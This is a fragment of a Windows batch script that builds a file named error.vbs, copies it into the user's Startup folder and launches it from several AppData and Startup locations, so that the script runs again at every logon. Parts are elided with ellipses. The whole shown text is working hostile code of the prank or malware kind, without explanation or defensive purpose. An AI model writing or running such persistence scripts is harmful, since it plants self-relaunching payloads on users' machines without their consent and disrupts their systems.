...
echo s.Run "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\error.vbs" >> "error.vbs"
...
copy error.vbs "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\error.vbs"

start "C:\Users\%username%\AppData\Roaming\error.vbs"
start "C:\Users\%username%\AppData\Local\error.vbs"
start "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\error.vbs"
start error.vbs
